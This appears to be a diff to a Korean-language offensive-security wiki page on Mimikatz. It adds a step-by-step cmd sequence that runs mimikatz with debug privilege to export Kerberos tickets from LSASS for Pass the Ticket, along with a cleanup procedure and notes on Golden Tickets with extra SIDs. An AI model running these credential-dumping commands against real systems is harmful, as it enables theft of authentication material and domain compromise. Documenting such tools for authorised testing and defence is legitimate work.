@@ -75,12 +75,18 @@ mimikatz # sekurlsa::ekeys
 
 ### Kerberos 티켓 내보내기
 
-```cmd
-mimikatz # sekurlsa::tickets /export
+`sekurlsa::tickets /export`는 현재 작업 디렉터리에 여러 `.kirbi` 파일을 만든다. 기존 파일과 섞이지 않도록 실행 전 없던 전용 디렉터리를 사용한다.
 
+```cmd
+if exist "<MIMIKATZ_TICKET_DIRECTORY>" exit /b 1
+mkdir "<MIMIKATZ_TICKET_DIRECTORY>"
+pushd "<MIMIKATZ_TICKET_DIRECTORY>"
+"<MIMIKATZ_EXE_PATH>" "privilege::debug" "sekurlsa::tickets /export" "exit"
+dir /b *.kirbi
+popd
 ```
 
-현재 세션의 Kerberos 티켓을 `.kirbi` 파일로 저장한다. 저장된 티켓은 Pass the Ticket에서 사용할 수 있다.
+상승된 컨텍스트에서는 다른 로그온 세션의 ticket까지 내보낼 수 있다. 비상승 컨텍스트와 권한·보호 상태에 따라 범위가 달라지므로 출력의 `Authentication Id`, 계정, service와 저장된 exact 파일명을 대응시킨다. 저장된 ticket은 Pass the Ticket에서 사용할 수 있다.
 
 
 ## 주요 옵션과 명령
@@ -116,6 +122,18 @@ mimikatz # sekurlsa::tickets /export
 | ticket 사용 실패 | SPN/realm/시간 문제 | `klist`, 시간 동기화, 대상 서비스 SPN 확인 |
 | `Extra SIDs`와 Golden Ticket 제출 성공 | 추가 SID가 포함된 ticket 생성·주입 | 부모 도메인 대상 서비스와 DCSync에서 실제 권한 확인 |
 
+## 변경 영향과 복구
+
+`sekurlsa::tickets /export`가 만든 `.kirbi`는 session key를 포함할 수 있는 민감한 인증 자료다. 후속 process의 ticket 사용을 종료한 뒤 `dir /a "<MIMIKATZ_TICKET_DIRECTORY>"`로 내용을 확인하고, 실행 출력에 기록된 각 `<EXPORTED_KIRBI_PATH>`만 반복해서 삭제한다.
+
+```cmd
+del "<EXPORTED_KIRBI_PATH>"
+rmdir "<MIMIKATZ_TICKET_DIRECTORY>"
+if exist "<MIMIKATZ_TICKET_DIRECTORY>" echo REMAINS
+```
+
+전용 디렉터리가 비어 있을 때만 `rmdir`가 성공한다. 마지막 명령이 아무것도 출력하지 않아야 export 파일 정리가 끝난 것이다. `sekurlsa::logonpasswords`·`ekeys`의 화면·terminal log와 이미 복사·주입한 인증 자료는 파일 삭제로 되돌릴 수 없다.
+
 ## 관련 공격기법
 
 - [[LSASS 메모리 덤프]]
@@ -131,3 +149,4 @@ mimikatz # sekurlsa::tickets /export
 
 - [gentilkiwi Mimikatz: lsadump module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
 - [gentilkiwi Mimikatz: sekurlsa module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)
+- [gentilkiwi Mimikatz: kerberos module](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos)
